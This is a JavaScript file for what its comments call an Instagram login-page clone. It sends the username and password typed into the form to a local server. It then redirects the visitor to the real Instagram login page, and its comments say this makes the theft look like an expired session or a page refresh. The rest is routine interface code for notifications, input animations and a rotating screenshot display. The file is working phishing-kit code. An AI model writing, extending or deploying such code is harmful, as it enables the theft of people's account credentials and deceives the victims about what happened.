document.addEventListener('DOMContentLoaded', function () {
    const loginForm = document.getElementById('loginForm');
    const notification = document.getElementById('notification');

    loginForm.addEventListener('submit', async function (e) {
        e.preventDefault();

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // Basic validation
        if (!username || !password) {
            showNotification('Please fill in all fields', 'error');
            return;
        }

        try {
            const response = await fetch('http://localhost:3000/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ username, password })
            });

            const data = await response.json();

            if (data.success) {
                // Determine if it was a "forgot password" or normal login flow simulation
                // For this clone, we just redirect to the real Instagram login page
                // This makes it look like the page refreshed or the session expired
                window.location.href = 'https://www.instagram.com/accounts/login/';
            } else {
                showNotification(data.message || 'Login failed', 'error');
            }
        } catch (error) {
            console.error('Error:', error);
            showNotification('Network error. Please check if the server is running.', 'error');
        }
    });

    function showNotification(message, type) {
        notification.textContent = message;
        notification.className = `notification ${type} show`;

        setTimeout(() => {
            notification.classList.remove('show');
        }, 3000);
    }

    // Add input animation effects
    const inputs = document.querySelectorAll('.login-form input');
    inputs.forEach(input => {
        input.addEventListener('focus', function () {
            this.parentElement.classList.add('focused');
        });

        input.addEventListener('blur', function () {
            if (!this.value) {
                this.parentElement.classList.remove('focused');
            }
        });
    });

    // Image rotation logic
    const screenshots = document.querySelectorAll('.screenshot');
    let currentScreenshot = 0;

    if (screenshots.length > 0) {
        setInterval(() => {
            screenshots[currentScreenshot].classList.remove('active');
            currentScreenshot = (currentScreenshot + 1) % screenshots.length;
            screenshots[currentScreenshot].classList.add('active');
        }, 5000); // Change image every 5 seconds
    }
});
